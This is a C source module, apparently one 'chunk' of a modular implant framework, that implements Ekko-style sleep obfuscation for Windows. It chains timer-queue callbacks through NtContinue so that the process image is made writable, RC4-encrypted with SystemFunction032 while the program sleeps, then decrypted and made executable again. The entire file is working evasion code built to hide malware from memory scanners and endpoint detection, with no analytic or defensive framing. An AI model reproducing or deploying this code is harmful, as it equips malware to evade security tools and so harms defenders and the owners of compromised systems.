// chunk: evasion/sleep_encrypt
// depends: (none)
// provides: obf_sleep
// headers: windows.h
// libs: advapi32
// note: Ekko-style sleep obfuscation — ROP chain via timer queue callbacks encrypts image during sleep. No attacker code executes during encrypt/decrypt.

#ifndef CHUNK_SLEEP_ENCRYPT
#define CHUNK_SLEEP_ENCRYPT

typedef struct { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING;
typedef NTSTATUS (NTAPI *pfnSystemFunction032)(USTRING *data, USTRING *key);
typedef NTSTATUS (NTAPI *pfnNtContinue)(PCONTEXT ctx, BOOLEAN alert);

static pfnNtContinue   g_pNtContinue = NULL;
static pfnSystemFunction032 g_pSF032  = NULL;

static void obf_sleep(DWORD ms) {
    if (!g_pNtContinue) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll)
            g_pNtContinue = (pfnNtContinue)GetProcAddress(ntdll, "NtContinue");
    }
    if (!g_pSF032) {
        HMODULE adv = LoadLibraryA("advapi32.dll");
        if (adv)
            g_pSF032 = (pfnSystemFunction032)GetProcAddress(adv, "SystemFunction032");
    }
    if (!g_pNtContinue || !g_pSF032) {
        Sleep(ms);
        return;
    }

    PVOID base = GetModuleHandleA(NULL);
    if (!base) { Sleep(ms); return; }

    DWORD img_size = ((PIMAGE_NT_HEADERS)((BYTE *)base +
        ((PIMAGE_DOS_HEADER)base)->e_lfanew))->OptionalHeader.SizeOfImage;

    unsigned char rc4key[16];
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        rc4key[i] = (unsigned char)((tick >> (i % 4 * 8)) ^ (i * 0x37 + 0x55));

    USTRING key_str = { 16, 16, rc4key };
    USTRING img_str = { img_size, img_size, base };
    DWORD old_prot = 0;

    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    HANDLE hQueue = CreateTimerQueue();
    HANDLE hTimer = NULL;

    CONTEXT ctx_base = {0};
    ctx_base.ContextFlags = CONTEXT_FULL;

    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)RtlCaptureContext,
        &ctx_base, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(hEvent, 100);

    CONTEXT ropRW, ropEnc, ropSleep, ropDec, ropRX, ropSignal;
    memcpy(&ropRW,     &ctx_base, sizeof(CONTEXT));
    memcpy(&ropEnc,    &ctx_base, sizeof(CONTEXT));
    memcpy(&ropSleep,  &ctx_base, sizeof(CONTEXT));
    memcpy(&ropDec,    &ctx_base, sizeof(CONTEXT));
    memcpy(&ropRX,     &ctx_base, sizeof(CONTEXT));
    memcpy(&ropSignal, &ctx_base, sizeof(CONTEXT));

    ropRW.Rsp -= 8;
    ropRW.Rip = (DWORD64)VirtualProtect;
    ropRW.Rcx = (DWORD64)base;
    ropRW.Rdx = (DWORD64)img_size;
    ropRW.R8  = PAGE_READWRITE;
    ropRW.R9  = (DWORD64)&old_prot;

    ropEnc.Rsp -= 8;
    ropEnc.Rip = (DWORD64)g_pSF032;
    ropEnc.Rcx = (DWORD64)&img_str;
    ropEnc.Rdx = (DWORD64)&key_str;

    ropSleep.Rsp -= 8;
    ropSleep.Rip = (DWORD64)WaitForSingleObject;
    ropSleep.Rcx = (DWORD64)((HANDLE)-1);
    ropSleep.Rdx = (DWORD64)ms;

    ropDec.Rsp -= 8;
    ropDec.Rip = (DWORD64)g_pSF032;
    ropDec.Rcx = (DWORD64)&img_str;
    ropDec.Rdx = (DWORD64)&key_str;

    ropRX.Rsp -= 8;
    ropRX.Rip = (DWORD64)VirtualProtect;
    ropRX.Rcx = (DWORD64)base;
    ropRX.Rdx = (DWORD64)img_size;
    ropRX.R8  = PAGE_EXECUTE_READWRITE;
    ropRX.R9  = (DWORD64)&old_prot;

    ropSignal.Rsp -= 8;
    ropSignal.Rip = (DWORD64)SetEvent;
    ropSignal.Rcx = (DWORD64)hEvent;

    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropRW,     100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropEnc,    200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropSleep,  300, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropDec,    400, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropRX,     500, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)g_pNtContinue,
        &ropSignal, 600, 0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, ms + 5000);
    DeleteTimerQueue(hQueue);
    CloseHandle(hEvent);
}

#endif
